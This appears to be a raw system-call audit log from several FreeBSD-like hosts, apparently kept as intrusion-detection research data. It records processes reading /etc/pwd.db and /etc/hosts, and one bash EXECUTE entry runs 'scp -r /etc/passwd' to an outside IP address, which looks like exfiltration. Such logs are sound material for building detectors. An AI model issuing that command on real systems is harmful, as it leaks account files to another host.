1558099443.200:498119382,09DD9F92-78A7-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099443.200:498119371,09DD9F92-78A7-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099443.200:498119360,09DD9F92-78A7-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099443.200:498119349,09DD9F92-78A7-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099443.191:498119320,09DD9F92-78A7-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099442.950:498119165,09B92DC4-78A7-11E9-B129-6C2B597E484C:bash,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099442.570:498118866,097DA175-78A7-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099442.570:498118859,097DA175-78A7-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099436.589:498107971,04ADBAEB-78A7-11E9-A28B-D4AE52C1DBD3:top,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099434.499:498103881,04ADBAEB-78A7-11E9-A28B-D4AE52C1DBD3:top,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099434.499:498103876,04ADBAEB-78A7-11E9-A28B-D4AE52C1DBD3:top,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099433.769:498103489,043DAD06-78A7-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099434.099:498103325,0471250E-78A7-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099433.779:498103103,043DAD06-78A7-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099424.819:498083865,FEE7DD7F-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099424.819:498083858,FEE7DD7F-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099425.379:498083306,FF3FAE42-78A6-11E9-A28B-D4AE52C1DBD3:ls,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099425.149:498082883,FF1B6103-78A6-11E9-A28B-D4AE52C1DBD3:bash,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099416.739:498063101,FA16AB52-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099416.739:498063094,FA16AB52-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099412.341:498051745,F7793494-78A6-11E9-B129-6C2B597E484C:ssh,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099412.341:498051735,F7793494-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099412.341:498051724,F7793494-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099412.341:498051713,F7793494-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099412.341:498051702,F7793494-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099412.341:498051691,F7793494-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099412.341:498051680,F7793494-78A6-11E9-B129-6C2B597E484C:ssh,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099411.580:498051419,F704DC81-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099411.580:498051412,F704DC81-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099411.980:498051106,F7433235-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099410.319:498050806,F645E4C9-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099409.999:498050614,F61276CD-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099409.999:498050607,F61276CD-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099410.449:498050376,F659B6CB-78A6-11E9-A28B-D4AE52C1DBD3:whoami,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099410.449:498050348,F659B6CB-78A6-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
1558099402.289:498033909,F058255F-78A6-11E9-A28B-D4AE52C1DBD3:sudo,CONNECT,F17DA438-78A6-11E9-A28B-D4AE52C1DBD3,/var/run/logpriv,ta1-cadets-1
1558099401.451:498032888,F0EA1B23-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-2
1558099401.451:498032881,F0EA1B23-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-2
1558099401.771:498029821,F12D4442-78A6-11E9-B41B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-2
1558099400.931:498025430,F0ACFE4B-78A6-11E9-B41B-D4AE52C1DBD3:bash,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-2
1558099400.621:498024638,F07B5601-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-2
1558099400.621:498024631,F07B5601-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-2
1558099399.089:498024006,EF93E898-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099398.769:498023760,EF6099C3-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099398.769:498023753,EF6099C3-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099394.901:498022389,ED1219FF-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-2
1558099394.901:498022382,ED1219FF-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-2
1558099395.211:498022004,ED442D8D-78A6-11E9-B41B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-2
1558099388.491:498017545,E942D12B-78A6-11E9-B41B-D4AE52C1DBD3:bash,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-2
1558099387.931:498017201,E8EA7C11-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-2
1558099387.931:498017182,E8EA7C11-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-2
1558099391.019:498009637,EAC225B9-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099391.019:498009630,EAC225B9-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099391.359:498008928,EAF77DB9-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099383.469:497988787,E643F7E9-78A6-11E9-A28B-D4AE52C1DBD3:bash,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099382.989:497981622,E5F7E78B-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099382.979:497981615,E5F7E78B-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099381.490:497976681,E5182005-78A6-11E9-B129-6C2B597E484C:sendmail,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099381.490:497976670,E5182005-78A6-11E9-B129-6C2B597E484C:sendmail,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099381.490:497976667,E5182005-78A6-11E9-B129-6C2B597E484C:sendmail,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099381.490:497976662,E5182005-78A6-11E9-B129-6C2B597E484C:sendmail,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099381.490:497976650,E51799D5-78A6-11E9-B129-6C2B597E484C:sendmail,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099381.480:497976372,E06BA903-78A6-11E9-B129-6C2B597E484C:sendmail,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099381.470:497976148,E06BA903-78A6-11E9-B129-6C2B597E484C:sendmail,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099381.470:497976129,E06BA903-78A6-11E9-B129-6C2B597E484C:sendmail,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099381.781:497976034,E542FFEA-78A6-11E9-B129-6C2B597E484C:mail.local,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099381.539:497974507,E479C298-78A6-11E9-A28B-D4AE52C1DBD3:scp,OPEN,28B1A6F9-C916-3251-96C9-2D1EA1327749,/etc/passwd,ta1-cadets-1
1558099381.480:497974168,E06BA903-78A6-11E9-B129-6C2B597E484C:sendmail,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099380.019:497973993,E4330F04-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099380.019:497973986,E4330F04-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099380.489:497973374,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.489:497973364,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.489:497973353,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.489:497973342,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.489:497973331,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.489:497973320,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.489:497973309,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.479:497973280,E47BB297-78A6-11E9-A28B-D4AE52C1DBD3:ssh,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.469:497973144,E479C298-78A6-11E9-A28B-D4AE52C1DBD3:scp,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099380.459:497973035,E479C298-78A6-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,B8FFD54B-E634-C156-B4E6-8D03E6C1084F,scp -r /etc/passwd admin@128.55.12.66:.,ta1-cadets-1
1558099380.339:497972955,E4660B62-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099361.679:497950891,D9453566-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099361.679:497950885,D9453566-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099361.679:497950883,D9453566-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099349.699:497939145,D2220F9A-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099349.359:497937393,D1ED2D1D-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099349.359:497937380,D1ED2D1D-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099345.729:497933428,CFC5FD05-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099345.419:497932558,CF87B51B-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099345.419:497932503,CF87B51B-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099320.009:497855552,C071E186-78A6-11E9-A28B-D4AE52C1DBD3:cron,CONNECT,C071E961-78A6-11E9-A28B-D4AE52C1DBD3,/var/run/logpriv,ta1-cadets-1
1558099320.011:497831330,C0726308-78A6-11E9-B41B-D4AE52C1DBD3:cron,CONNECT,C0726DCE-78A6-11E9-B41B-D4AE52C1DBD3,/var/run/logpriv,ta1-cadets-2
1558099320.010:497809079,C0723417-78A6-11E9-B129-6C2B597E484C:cron,CONNECT,C0723ACB-78A6-11E9-B129-6C2B597E484C,/var/run/logpriv,ta1-cadets-3
1558099313.739:497799933,BCB44DD6-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099313.429:497799293,BC826FEF-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099313.429:497799286,BC826FEF-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099308.341:497793896,B97D2ADE-78A6-11E9-B41B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-2
1558099308.031:497793622,B94A16A1-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-2
1558099308.021:497793615,B94A16A1-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-2
1558099295.209:497787664,B1A7B117-78A6-11E9-A28B-D4AE52C1DBD3:top,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099295.209:497787654,B1A7B117-78A6-11E9-A28B-D4AE52C1DBD3:top,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099295.209:497787643,B1A7B117-78A6-11E9-A28B-D4AE52C1DBD3:top,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099295.209:497787632,B1A7B117-78A6-11E9-A28B-D4AE52C1DBD3:top,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099295.209:497787627,B1A7B117-78A6-11E9-A28B-D4AE52C1DBD3:top,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099294.699:497787356,B15B5B8F-78A6-11E9-A28B-D4AE52C1DBD3:bash,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099294.379:497786997,B1276A9E-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099294.379:497786990,B1276A9E-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099277.741:497675399,A73C41F1-78A6-11E9-B129-6C2B597E484C:alpine,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099277.720:497675386,A73C41F1-78A6-11E9-B129-6C2B597E484C:alpine,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099277.720:497675374,A73C41F1-78A6-11E9-B129-6C2B597E484C:alpine,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099277.720:497675364,A73C41F1-78A6-11E9-B129-6C2B597E484C:alpine,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099277.720:497675353,A73C41F1-78A6-11E9-B129-6C2B597E484C:alpine,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099277.720:497675323,A73C41F1-78A6-11E9-B129-6C2B597E484C:alpine,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099273.280:497664411,A49741C5-78A6-11E9-B129-6C2B597E484C:bash,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099271.191:497662406,A357A7C9-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099271.191:497662399,A357A7C9-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099268.591:497661438,A1CA89F9-78A6-11E9-B41B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-2
1558099268.191:497661193,A18BC3C9-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-2
1558099268.191:497661186,A18BC3C9-78A6-11E9-B41B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-2
1558099259.949:497658294,9C9BC5C6-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099263.711:497658165,9EE2BFC1-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099263.411:497658020,9EB3C92F-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099263.411:497658013,9EB3C92F-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099259.569:497656371,9C67DB90-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099259.569:497656364,9C67DB90-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099258.179:497655741,9B9663CB-78A6-11E9-A28B-D4AE52C1DBD3:ls,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099257.939:497655483,9B71DFC4-78A6-11E9-A28B-D4AE52C1DBD3:bash,READ,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099257.629:497654969,9B4028DE-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099257.629:497654962,9B4028DE-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099257.580:497653934,9B3A763F-78A6-11E9-B129-6C2B597E484C:wget,READ,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099256.810:497653358,9AC466EB-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099256.810:497653351,9AC466EB-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099257.111:497653119,9AF3A07F-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099254.709:497652145,99844F66-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099254.379:497651601,994FDE95-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099254.379:497651594,994FDE95-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099253.969:497651074,991323A3-78A6-11E9-A28B-D4AE52C1DBD3:bash,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099253.649:497650701,98E05268-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099253.649:497650694,98E05268-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099253.111:497650200,988FA45F-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-3
1558099253.111:497650193,988FA45F-78A6-11E9-B129-6C2B597E484C:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-3
1558099253.410:497649899,98BF3CA6-78A6-11E9-B129-6C2B597E484C:bash,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db,ta1-cadets-3
1558099252.809:497649501,98608B5E-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,D1042279-ADA7-1A51-A7AD-427D911A1470,/etc/hosts.allow,ta1-cadets-1
1558099252.809:497649494,98608B5E-78A6-11E9-A28B-D4AE52C1DBD3:sshd,OPEN,373D02C0-A81B-7D54-9BA8-F181547DCBCF,/etc/hosts,ta1-cadets-1
1558099253.359:497649267,98B71AE5-78A6-11E9-A28B-D4AE52C1DBD3:whoami,OPEN,15D7DD48-70AF-7657-AF70-1CEF4776FAB6,/etc/pwd.db,ta1-cadets-1
1558099253.349:497649239,98B71AE5-78A6-11E9-A28B-D4AE52C1DBD3:bash,EXECUTE,8FA40B6F-BAF5-AF51-B5BA-4F9291AFCEAC,whoami,ta1-cadets-1
